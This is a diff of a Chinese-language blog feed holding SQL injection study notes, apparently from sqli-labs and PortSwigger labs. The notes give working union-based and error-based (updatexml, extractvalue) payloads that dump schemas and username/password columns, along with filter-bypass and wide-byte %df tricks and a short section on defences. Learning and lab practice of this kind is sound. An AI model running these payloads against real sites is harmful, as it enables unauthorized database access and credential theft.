-    <content><![CDATA[<h2 id="爆破语句"><a href="#爆破语句" class="headerlink" title="爆破语句"></a>爆破语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段</span><br></pre></td></tr></table></figure>
-
-<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>其实注释本来的作用也就是闭合语句</strong></p>
-<p><strong>;%00</strong>代替–+进行注释</p>
-<p>闭合就是针对输入的，一般会对输入的参数再加上一对单引号</p>
-<h2 id="括号判断"><a href="#括号判断" class="headerlink" title="括号判断"></a>括号判断</h2><p>小括号判断：2’ and ‘1’&#x3D;’1 如果有括号，回显为id&#x3D;1页面</p>
-<p>没括号则是id&#x3D;2页面</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131633798.png" alt="image-20230523131633798"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131638108.png" alt="image-20230523131638108"></p>
-<h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><blockquote>
-<p>union select绕过 ：&#x2F;<strong>&#x2F;UNION&#x2F;</strong>&#x2F;SELECT&#x2F;**&#x2F;</p>
-</blockquote>
-<blockquote>
-<p>%75%6e%6f%69%6e %73%65%6c%65%63%74</p>
-</blockquote>
-<p>[SQL注入绕过关键词过滤的小技巧及原理（union select为例）_sql注入关键字过滤绕过_桑榆__的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request_id%22:%22167955372116800192238946%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955372116800192238946&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=union">https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request%5Fid%22%3A%22167955372116800192238946%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167955372116800192238946&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=union</a> select绕过&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<h3 id="空格、注释绕过"><a href="#空格、注释绕过" class="headerlink" title="空格、注释绕过"></a>空格、注释绕过</h3><p>空格绕过：%0B代替空格，括号绕过 and(1&#x3D;0)</p>
-<p>注释绕过：用<strong>单引号闭合</strong>替代注释或者使用**;%00替代**。</p>
-<p>例如:?id&#x3D;1’ union select 1,2,3 and ‘1’&#x3D;’1</p>
-<h3 id="引号被注释"><a href="#引号被注释" class="headerlink" title="引号被注释"></a>引号被注释</h3><p><strong>闭合的用%df来（宽字节），字符串值处用16进制来</strong></p>
-<p><strong>mysql_real_escape_string() 函数</strong></p>
-<p>用来<a href="https://so.csdn.net/so/search?q=%E8%BD%AC%E4%B9%89&spm=1001.2101.3001.7020">转义</a> SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串(即在字符前加”&quot;)。如果失败，则返回 false。</p>
-<h2 id="宽字节注入-df"><a href="#宽字节注入-df" class="headerlink" title="宽字节注入%df"></a>宽字节注入%df</h2><p><a href="https://blog.csdn.net/m0_63303407/article/details/127204281?ops_request_misc=%7B%22request_id%22:%22167955936416782427413061%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955936416782427413061&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-127204281-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">slilabs靶场记录宽字节绕过(七)_mysql_real_escape_string 绕过_wanan0red的博客-CSDN博客</a></p>
-<ul>
-<li>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</li>
-<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</li>
-</ul>
-<p>预定义字符是：</p>
-<ul>
-<li>单引号（’）</li>
-<li>双引号（”）</li>
-<li>反斜杠（\）</li>
-<li>NULL</li>
-</ul>
-<blockquote>
-<p><code>uname=%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=</code><strong>0x7365637572697479</strong>) #&amp;passwd&#x3D;1&amp;submit&#x3D;Submit (字符串附近的引号用%df不行，所以将值转化为十六进制，0x…)</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132005607.png" alt="image-20230523132005607"></p>
-<h3 id="宽字节注入的防御："><a href="#宽字节注入的防御：" class="headerlink" title="宽字节注入的防御："></a>宽字节注入的防御：</h3><p><img src="/../../../Typora/img111/image-20230523132040435.png" alt="image-20230523132040435"></p>
-<h3 id="limit-0-1"><a href="#limit-0-1" class="headerlink" title="limit 0,1"></a>limit 0,1</h3><p>[MySQL 分页查询limit性能缺陷和优化方案_limit性能问题_西瓜游侠的博客-CSDN博客](<a href="https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&request_id=&biz_id=102&utm_term=mysql">https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=mysql</a> limit漏洞&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-2-117190087.142^v80^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<p><code>limit m,n</code></p>
-<p>其中，m是偏移量，n是要查询的数量。</p>
-<blockquote>
-<p>当偏移量m过大的时候，查询效率会很低。因为MySQL是先查出m+n个数据，然后抛弃掉前m个数据。</p>
-</blockquote>
-<p><strong>limit 0,1从第一行开始，返回一行</strong></p>
-<p><strong>limit 1,1从第二行开始，返回一行</strong></p>
-<p><strong>limit 2,1从第三行开始，返回一行</strong></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132214461.png" alt="image-20230523132214461"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132219086.png" alt="image-20230523132219086"></p>
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
-<li><p>参数化查询（数据库服务器在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有有损的指令，也不会被数据库所运行，仅认为它是一个参数。），最好设定传入参数类型，比如是否是数字，<strong>is_numeric($_GET[‘id’])</strong> ，这样就限制了字符的输入。</p>
-</li>
-<li><p>参数长度限制，在PHP下，可用strlen函数检查输入长度</p>
-</li>
-<li><p>函数过滤转义，如addslashes()，它转义一些特殊字符</p>
-</li>
-<li><p>预编译语句，即将要执行的sql语句固定下来，将所传入的参数绑定为一个变量，用”?”表示。</p>
-<p><code>query=&quot;select password from users where username=&#39;admin&#39; or 1=1 &quot;;</code></p>
-<p>这样的话，<strong>admin’ or 1&#x3D;1</strong> 将作为username的值，避免了sql语句的拼接闭合等非法操作。</p>
-</li>
-</ol>
-<p>危险参数过滤：</p>
-<p>1）黑名单过滤：将一些可能用于注入的敏感字符写入黑名单中，如’（单引号）、union、select等，也可能使用正则表达式做过滤，但黑名单可能会有疏漏。</p>
-<p>2）白名单过滤：例如，用数据库中的已知值校对，通常对参数结果进行合法性校验，符合白名单的数据方可显示。</p>
-<p>3）参数转义：对变量默认进行addsalashes（在预定义字符前添加反斜杠），使得SQL注入语句构造失败。</p>
-<p>由于白名单方式要求输出参数有着非常明显的特点，因此适用的业务场景非常有限。总体来说，防护手段仍建议以黑名单+参数转义方式为主，这也是目前针对SQL敏感参数处理的主要方式，以下逐项进行分析。</p>
-<h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><p><code>select/*!user*/  from users;</code></p>
-<p><a href="http://t.csdn.cn/UD0iS">参考Zero_Adam</a></p>
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>Mysql爆破语句</tag>
-        <tag>注入绕过</tag>
-        <tag>sql注入技巧</tag>
-        <tag>sql注入防御</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入之报错注入</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
-<p><strong>extravtvalue()</strong></p>
-<p>floor()、rand()…主键重复方式，暂时不展开</p>
-<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
-<blockquote>
-<p>XML_document:是字符串String格式，为XML文档对象名称</p>
-<p>Xpath_string:Xpath格式的字符串</p>
-<p>new_value:string格式，替换查找到的符合条件的数据</p>
-</blockquote>
-<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>报错注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入之联合注入</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
-<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们后面要对字段数进行判断。</p>
-<p>mysql中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。</p>
-<p>1、    判断注入点</p>
-<p>假如存在这么一个参数?id&#x3D;1，可以在参数后面加个单引号或者双引号看是否爆sql语法的错误</p>
-<p>2、    判断<strong>闭合</strong>形式</p>
-<p>主要是判断是否是<strong>整形</strong>闭合，还是字符型闭合，如果是字符型闭合 ，又看是否是<strong>单引</strong>号闭合、双引号闭合，或者是<strong>引号加括号</strong>的闭合形式。</p>
-<p>3、判断查询列数</p>
-<p>1’ order by 1–+</p>
-<p>当order by 3时排序第三个栏位回显正常，而order by 4回显错误，可以判断出当前sql语句向该表查询了三个字段。所以说orderby只是判断了当前sql语句查询的字段数，并不是判断Users表中有几个列，目的是为了符合union的用法，即有相同的字段数。</p>
-<p>20231008<strong>更新一下</strong></p>
-<p>除了order by，还可以用以下方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
-
-<p>然后，尝试替换位置</p>
-<blockquote>
-<p>平时都是union select 1,2,3，这种方法失效了嘞</p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,<span class="operator">%</span><span class="number">27</span>qn<span class="operator">%</span><span class="number">27</span>,<span class="keyword">NULL</span><span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span>qn<span class="operator">%</span><span class="number">27</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="operator">%</span><span class="number">27</span>qn<span class="operator">%</span><span class="number">27</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span>,<span class="operator">%</span><span class="number">272</span><span class="operator">%</span><span class="number">27</span><span class="comment">--+ #两个位置都有的话</span></span><br><span class="line"></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>username,password<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="comment">--+ #替换字段</span></span><br><span class="line"></span><br><span class="line">#如果只能显示一个位置</span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,username<span class="operator">||</span><span class="operator">%</span><span class="number">27</span><span class="operator">~</span><span class="operator">%</span><span class="number">27</span><span class="operator">||</span>password<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,concat(username,<span class="operator">%</span><span class="number">27</span><span class="operator">~</span><span class="operator">%</span><span class="number">27</span>,password)<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="comment">--+</span></span><br><span class="line">#wiener<span class="operator">~</span><span class="number">5</span>qgm</span><br><span class="line"></span><br><span class="line">#数据库信息</span><br><span class="line"></span><br><span class="line">Database type	Query</span><br><span class="line">Microsoft, MySQL	<span class="keyword">SELECT</span> @<span class="variable">@version</span></span><br><span class="line">Oracle	<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> v$version</span><br><span class="line">PostgreSQL	<span class="keyword">SELECT</span> version()</span><br><span class="line"></span><br><span class="line">s<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span>,(<span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>@<span class="variable">@version</span>)<span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27; union select &#x27;</span><span class="number">1</span><span class="string">&#x27;,(version())--</span></span><br><span class="line"><span class="string">#如果成功，证明是一个MySQL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#列出数据库内容</span></span><br><span class="line"><span class="string">#除了Oracle，大部分数据库都有一套自己的information_schema</span></span><br><span class="line"><span class="string">#以postgresql为例</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#爆数据库的表名</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,table_name <span class="keyword">from</span> information_schema.tables<span class="comment">--</span></span><br><span class="line">#<span class="string">&#x27; union select NULL,(select table_name from #information_schema.tables)-- 不行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#它还必须有一个是NULL，不像sqli-lab的 union select 1,table_name from...</span></span><br><span class="line"><span class="string">#貌似也没有  union select 1,(select * from information_schema.tables),3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#爆表的列名</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users_edheuq&#x27;</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">#爆列的字段</span><br><span class="line"><span class="string">&#x27; union select username_cnxxxn,password_omaiyx from users_edheuq--</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
-
-<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
-<p>4、判断显示位</p>
-<p>对于一个网页，如果它的列数有三列，但可能只有1，2列的数据返回页面前端。所以我们需要查询哪个列会回显，得用unionselect 1,2,3来查看回显位。</p>
-<p>常用语句为-1’ union select 1,2,3–+</p>
-<p>这里一定得是-1 union……，而不是1 union…..因为程序在展示数据的时候通常只会取结果集的第一行数据，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
-<p>只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p>
-<p>5、获取所有数据库名</p>
-<p>6、获取数据库所有表名</p>
-<p>7、获取字段名 </p>
-<p>8、获取字段中的数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>
-
-<p>参考：<a href="https://blog.csdn.net/qq_61237064/article/details/121758528?ops_request_misc=%7B%22request_id%22:%22168049213216800211546816%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168049213216800211546816&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-121758528-null-null.142%5Ev80%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">sql注入中的联合注入_ZredamanJ的博客-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>联合注入</tag>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -15216,6 +15093,162 @@
       <tags>
         <tag>sql注入</tag>
         <tag>绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入-tips</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/</url>
+    <content><![CDATA[<h2 id="爆破语句"><a href="#爆破语句" class="headerlink" title="爆破语句"></a>爆破语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段</span><br></pre></td></tr></table></figure>
+
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>其实注释本来的作用也就是闭合语句</strong></p>
+<p><strong>;%00</strong>代替–+进行注释</p>
+<p>闭合就是针对输入的，一般会对输入的参数再加上一对单引号</p>
+<h2 id="括号判断"><a href="#括号判断" class="headerlink" title="括号判断"></a>括号判断</h2><p>小括号判断：2’ and ‘1’&#x3D;’1 如果有括号，回显为id&#x3D;1页面</p>
+<p>没括号则是id&#x3D;2页面</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131633798.png" alt="image-20230523131633798"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131638108.png" alt="image-20230523131638108"></p>
+<h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><blockquote>
+<p>union select绕过 ：&#x2F;<strong>&#x2F;UNION&#x2F;</strong>&#x2F;SELECT&#x2F;**&#x2F;</p>
+</blockquote>
+<blockquote>
+<p>%75%6e%6f%69%6e %73%65%6c%65%63%74</p>
+</blockquote>
+<p>[SQL注入绕过关键词过滤的小技巧及原理（union select为例）_sql注入关键字过滤绕过_桑榆__的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request_id%22:%22167955372116800192238946%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955372116800192238946&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=union">https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request%5Fid%22%3A%22167955372116800192238946%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167955372116800192238946&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=union</a> select绕过&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<h3 id="空格、注释绕过"><a href="#空格、注释绕过" class="headerlink" title="空格、注释绕过"></a>空格、注释绕过</h3><p>空格绕过：%0B代替空格，括号绕过 and(1&#x3D;0)</p>
+<p>注释绕过：用<strong>单引号闭合</strong>替代注释或者使用**;%00替代**。</p>
+<p>例如:?id&#x3D;1’ union select 1,2,3 and ‘1’&#x3D;’1</p>
+<h3 id="引号被注释"><a href="#引号被注释" class="headerlink" title="引号被注释"></a>引号被注释</h3><p><strong>闭合的用%df来（宽字节），字符串值处用16进制来</strong></p>
+<p><strong>mysql_real_escape_string() 函数</strong></p>
+<p>用来<a href="https://so.csdn.net/so/search?q=%E8%BD%AC%E4%B9%89&spm=1001.2101.3001.7020">转义</a> SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串(即在字符前加”&quot;)。如果失败，则返回 false。</p>
+<h2 id="宽字节注入-df"><a href="#宽字节注入-df" class="headerlink" title="宽字节注入%df"></a>宽字节注入%df</h2><p><a href="https://blog.csdn.net/m0_63303407/article/details/127204281?ops_request_misc=%7B%22request_id%22:%22167955936416782427413061%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955936416782427413061&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-127204281-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">slilabs靶场记录宽字节绕过(七)_mysql_real_escape_string 绕过_wanan0red的博客-CSDN博客</a></p>
+<ul>
+<li>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</li>
+<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</li>
+</ul>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<blockquote>
+<p><code>uname=%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=</code><strong>0x7365637572697479</strong>) #&amp;passwd&#x3D;1&amp;submit&#x3D;Submit (字符串附近的引号用%df不行，所以将值转化为十六进制，0x…)</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132005607.png" alt="image-20230523132005607"></p>
+<h3 id="宽字节注入的防御："><a href="#宽字节注入的防御：" class="headerlink" title="宽字节注入的防御："></a>宽字节注入的防御：</h3><p><img src="/../../../Typora/img111/image-20230523132040435.png" alt="image-20230523132040435"></p>
+<h3 id="limit-0-1"><a href="#limit-0-1" class="headerlink" title="limit 0,1"></a>limit 0,1</h3><p>[MySQL 分页查询limit性能缺陷和优化方案_limit性能问题_西瓜游侠的博客-CSDN博客](<a href="https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&request_id=&biz_id=102&utm_term=mysql">https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=mysql</a> limit漏洞&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-2-117190087.142^v80^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<p><code>limit m,n</code></p>
+<p>其中，m是偏移量，n是要查询的数量。</p>
